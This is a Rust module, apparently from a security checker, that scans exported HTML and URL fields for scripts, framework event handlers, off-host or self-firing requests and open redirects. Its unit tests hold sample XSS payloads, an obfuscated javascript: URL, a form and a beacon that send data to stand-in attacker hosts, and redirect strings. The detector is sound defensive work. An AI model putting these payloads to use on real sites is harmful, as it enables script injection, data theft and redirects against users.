//! Output labels: what the platform allows in the export's result.
//!
//! `html:no-scripts`: no script runs from this markup (no `<script>`, no
//! event handler of any framework, no `javascript:` URL). `html:safe`: no
//! scripts, and the markup makes no request the user didn't ask for to
//! another host or to a sensitive route (no meta refresh, no form off the
//! app, nothing loaded from another host, nothing that fires by itself).
//! `url:local`: a path on the app's own host, so `//evil`, `/\evil` and
//! schemes fail.
//!
//! The browser model is static and knows no framework: standard HTML
//! attributes by their meaning, every other attribute by the shape of its
//! value (see `urls::in_html`). Names that look like handlers (`on…`,
//! `@…`, `…on:…`, `(…)`) count as handlers.

use std::sync::LazyLock;

use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

use crate::detect::{Finding, Severity};
use crate::harness::field;
use crate::manifest::Manifest;
use crate::record::{OutcomeKind, RunRecord};
use crate::urls::{classify, elements, in_html, normalize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum OutputLabel {
    #[serde(rename = "html:no-scripts")]
    HtmlNoScripts,
    #[serde(rename = "html:safe")]
    HtmlSafe,
    #[serde(rename = "url:local")]
    UrlLocal,
}

impl OutputLabel {
    pub fn name(self) -> &'static str {
        match self {
            OutputLabel::HtmlNoScripts => "html:no-scripts",
            OutputLabel::HtmlSafe => "html:safe",
            OutputLabel::UrlLocal => "url:local",
        }
    }
}

/// Tags that run or embed active content.
const ACTIVE_TAGS: &[&str] = &["script", "object", "embed", "applet"];
/// Attributes whose value is text for people, never code.
const TEXT_ATTRS: &[&str] = &["class", "id", "title", "alt", "name", "type", "value", "placeholder", "content", "label", "lang", "style", "role", "for"];
/// A call (`f(…)`, `a.b(…)`), an arrow function, or a `js:` prefix.
static CODE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^\s*js:|[A-Za-z_$][\w$.]*\s*\([^)]*\)|=>").unwrap());

/// Something found in the markup: what, the tag, how bad.
#[derive(Debug, Clone)]
pub struct Hit {
    pub what: String,
    pub tag: String,
    pub severity: Severity,
}

fn hit(what: String, tag: &str, severity: Severity) -> Hit {
    Hit { what, tag: tag.to_string(), severity }
}

/// Whether an attribute name looks like an event handler in some
/// framework: `onclick`, `@click`, `x-on:click`, `hx-on::after`,
/// `v-on:click`, `(click)`, `data-on-click`.
fn is_handler(k: &str) -> bool {
    let k = k.strip_prefix("data-").unwrap_or(k);
    if k.starts_with('@') || k.starts_with('(') {
        return true;
    }
    if k.len() > 2 && k.starts_with("on") && k[2..].chars().all(|c| c.is_ascii_alphabetic()) {
        return true;
    }
    let w: Vec<&str> = k.split(['-', ':', '.', '_']).collect();
    w.iter().enumerate().any(|(i, x)| *x == "on" && i + 1 < w.len())
}

/// Ways the markup can run a script.
pub fn scripts(html: &str) -> Vec<Hit> {
    let mut out = Vec::new();
    for t in elements(html).iter() {
        if ACTIVE_TAGS.contains(&t.name.as_str()) {
            out.push(hit(format!("a <{}> element", t.name), &t.raw, Severity::Fail));
            continue;
        }
        if t.name == "iframe" && t.get("srcdoc").is_some() {
            out.push(hit("an iframe with srcdoc".into(), &t.raw, Severity::Fail));
        }
        for (k, v) in &t.attrs {
            let v = normalize(v);
            if is_handler(k) {
                out.push(hit(format!("an event handler ({k})"), &t.raw, Severity::Fail));
            } else if k == "content" && t.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
                if let Some(i) = v.to_ascii_lowercase().find("url=")
                    && script_url(&v[i + 4..])
                {
                    out.push(hit("a meta refresh to a script URL".into(), &t.raw, Severity::Fail));
                }
            } else if script_url(&v) {
                out.push(hit(format!("a script URL in {k}"), &t.raw, Severity::Fail));
            } else if v.trim_start().to_ascii_lowercase().starts_with("js:") {
                out.push(hit(format!("script in {k}"), &t.raw, Severity::Fail));
            } else if !TEXT_ATTRS.contains(&k.as_str()) && !k.starts_with("aria-") && CODE.is_match(&v) {
                // A framework may run it.
                out.push(hit(format!("an attribute that looks like code ({k})"), &t.raw, Severity::Warn));
            }
        }
    }
    out
}

fn script_url(v: &str) -> bool {
    let u = normalize(v).to_ascii_lowercase();
    let kind = classify(&u).0;
    kind == "javascript" || u.starts_with("data:text/html") || u.starts_with("data:application/xhtml") || u.starts_with("data:image/svg")
}

/// Requests the markup makes that the user didn't ask for, or makes to
/// another host or a sensitive route.
pub fn unsafe_actions(html: &str, sensitive: &[String]) -> Vec<Hit> {
    let mut out = Vec::new();
    let is_sensitive = |u: &str| {
        let path = u.split(['?', '#']).next().unwrap_or(u);
        sensitive.iter().find(|s| path == s.as_str() || path.starts_with(&format!("{}/", s.trim_end_matches('/'))))
    };
    for t in elements(html).iter() {
        if t.name == "meta" && t.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
            out.push(hit("a meta refresh (the page moves on by itself)".into(), &t.raw, Severity::Fail));
        }
    }
    // A URL joined from pieces counts only where the element shows nothing
    // else: pieces join into noise too.
    let mut shown: Vec<String> = Vec::new();
    for f in in_html(html) {
        if f.source == "joined" && shown.contains(&f.tag) {
            continue;
        }
        let before = out.len();
        let u = normalize(&f.url);
        let kind = classify(&u).0;
        if matches!(kind.as_str(), "javascript" | "data" | "mailto") {
            continue;
        }
        let short: String = u.chars().take(80).collect();
        let (k, off) = (&f.source, kind != "same_host");
        let what = match f.trigger.as_str() {
            "form" => "a form",
            "load" => "a load",
            "unknown" | "auto" => "a request in an attribute of no standard meaning",
            // Links are the user's choice; refresh is reported above.
            _ => continue,
        };
        if off {
            out.push(hit(format!("{what} to {short} ({k}, {kind})"), &f.tag, Severity::Fail));
        } else if let Some(s) = is_sensitive(&u) {
            out.push(hit(format!("{what} to the sensitive route {s} ({k} = {short})"), &f.tag, Severity::Fail));
        } else if f.trigger == "auto" {
            out.push(hit(format!("a request that fires by itself ({k} = {short})"), &f.tag, Severity::Fail));
        }
        if out.len() > before {
            shown.push(f.tag.clone());
        }
    }
    out
}

/// Whether a URL is a path on the app's own host.
pub fn is_local(u: &str) -> bool {
    let n = normalize(u);
    classify(&n).0 == "same_host" && !n.contains("\\") && !n.to_ascii_lowercase().starts_with("/%2f") && !n.to_ascii_lowercase().starts_with("/%5c")
}

/// Output label findings of one run.
pub fn check(r: &RunRecord, m: &Manifest) -> Vec<Finding> {
    let Some(entry) = m.entry.as_ref().filter(|e| !e.result.is_empty()) else { return Vec::new() };
    let Some(result) = &r.result else { return Vec::new() };
    if r.outcome.kind != OutcomeKind::Ok {
        return Vec::new();
    }
    let ex = &r.spec.export;
    let run = Some(r.id.as_str());
    let req = request_texts(r);
    let mut out = Vec::new();
    for (path, label) in &entry.result {
        let Some(Value::String(v)) = field(result, path) else { continue };
        let from_req = |s: &str| req.iter().find(|q| s.contains(q.as_str())).cloned();
        match label {
            OutputLabel::HtmlNoScripts | OutputLabel::HtmlSafe => {
                for Hit { what, tag, severity } in scripts(v) {
                    out.push(Finding::new(
                        "script_in_output",
                        &format!("{ex}\0{path}\0{}", what.split(' ').take(3).collect::<Vec<_>>().join(" ")),
                        severity,
                        format!(
                            "{path} is labelled {} but holds {what}{}",
                            label.name(),
                            from_req(&tag).map(|_| ", with text from the request").unwrap_or_default()
                        ),
                        json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
                        run,
                    ));
                }
                if *label == OutputLabel::HtmlSafe {
                    for Hit { what, tag, severity } in unsafe_actions(v, &entry.sensitive_paths) {
                        out.push(Finding::new(
                            "unsafe_action",
                            &format!("{ex}\0{path}\0{}", what.split(' ').take(4).collect::<Vec<_>>().join(" ")),
                            severity,
                            format!("{path} is labelled html:safe but holds {what}"),
                            json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
                            run,
                        ));
                    }
                }
            }
            OutputLabel::UrlLocal => {
                if v.is_empty() || is_local(v) {
                    continue;
                }
                let (kind, sev, how) = match from_req(v) {
                    Some(q) => ("open_redirect", Severity::Fail, format!("; it comes from the request ({q:?})")),
                    None => ("non_local_url", Severity::Warn, String::new()),
                };
                out.push(Finding::new(
                    kind,
                    &format!("{ex}\0{path}"),
                    sev,
                    format!("{path} is labelled url:local but is {:?} ({}){how}", v.chars().take(80).collect::<String>(), classify(&normalize(v)).0),
                    json!({"path": path, "label": label.name(), "value": v, "kind": classify(&normalize(v)).0}),
                    run,
                ));
            }
        }
    }
    out
}

/// Strings in the request a user could have chosen (4 characters or more).
fn request_texts(r: &RunRecord) -> Vec<String> {
    fn walk(v: &Value, out: &mut Vec<String>) {
        match v {
            Value::String(s) if s.chars().count() >= 4 => out.push(s.clone()),
            Value::Array(a) => a.iter().for_each(|x| walk(x, out)),
            Value::Object(o) => o.values().for_each(|x| walk(x, out)),
            _ => {}
        }
    }
    let mut out = Vec::new();
    r.spec.args.iter().for_each(|a| walk(a, &mut out));
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn whats(v: Vec<Hit>) -> Vec<String> {
        v.into_iter().map(|h| h.what).collect()
    }

    #[test]
    fn finds_scripts() {
        assert!(scripts("<p class=x>Hi <a href=\"/a\">a</a></p>").is_empty());
        assert_eq!(whats(scripts("<SCRIPT>alert(1)</SCRIPT>")), ["a <script> element"]);
        assert_eq!(whats(scripts("<img src=x OnError=alert(1)>")), ["an event handler (onerror)"]);
        assert_eq!(whats(scripts("<a href=\"jav&#x09;ascript&colon;alert(1)\">x</a>")), ["a script URL in href"]);
        // Handlers of any framework, by the shape of the name.
        for h in ["hx-on:click", "x-on:click", "@click", "v-on:submit", "(click)", "data-on-click", "hx-on::after-request"] {
            assert_eq!(whats(scripts(&format!("<button {h}=\"go()\">x</button>"))), [format!("an event handler ({h})")], "{h}");
        }
        assert_eq!(whats(scripts("<div hx-vals='js:{a: evil()}'></div>")), ["script in hx-vals"]);
        assert_eq!(whats(scripts("<div data-url=\"javascript:evil()\"></div>")), ["a script URL in data-url"]);
        // Code-shaped values in other attributes: a framework may run them.
        let h = scripts("<div x-init=\"fetch('/x')\"></div>");
        assert_eq!((h[0].what.as_str(), h[0].severity), ("an attribute that looks like code (x-init)", Severity::Warn));
        assert!(scripts("<div hx-vals='{\"a\": 1}' title=\"call (555) 123\" x-show=\"open\" data-on=\"x\"></div>").is_empty());
    }

    #[test]
    fn finds_unsafe_actions() {
        let s = vec!["/admin".to_string()];
        let n = |h: &str| unsafe_actions(h, &s).len();
        assert_eq!(n("<form method=post action=\"/order\"><button>x</button></form>"), 0);
        assert_eq!(n("<a href=\"https://other.example/\">x</a>"), 0);
        assert_eq!(n("<form action=\"https://evil.example/steal\">"), 1);
        assert_eq!(n("<meta http-equiv=\"refresh\" content=\"0;url=/x\">"), 1);
        // htmx, Alpine, Turbo, data attributes: one rule.
        assert_eq!(n("<button hx-post=\"/admin/users/7/delete\">x</button>"), 1);
        assert_eq!(n("<div hx-get=\"/feed\" hx-trigger=\"load\"></div>"), 1);
        assert_eq!(n("<div hx-get=\"/feed\" hx-trigger=\"click\"></div>"), 0);
        assert_eq!(n("<div x-init=\"fetch('/admin/wipe')\"></div>"), 1);
        assert_eq!(n("<div x-intersect=\"$fetch('/feed')\"></div>"), 1);
        assert_eq!(n("<turbo-frame src=\"https://evil.example/f\"></turbo-frame>"), 1);
        assert_eq!(n("<img src=\"https://t.example/p.gif\">"), 1);
        assert_eq!(n("<img src=\"/logo.png\">"), 0);
        assert_eq!(n("<div data-endpoint=\"/admin/x\"></div>"), 1);
        assert_eq!(n("<script>navigator.sendBeacon('https://c.example/p')</script>"), 1);
    }

    #[test]
    fn local_urls() {
        assert!(is_local("/orders/7?x=1"));
        assert!(is_local("orders"));
        assert!(!is_local("//evil.example/"));
        assert!(!is_local("/\\evil.example"));
        assert!(!is_local("https://evil.example/"));
        assert!(!is_local("javascript:alert(1)"));
        assert!(!is_local("\t//evil.example"));
    }
}
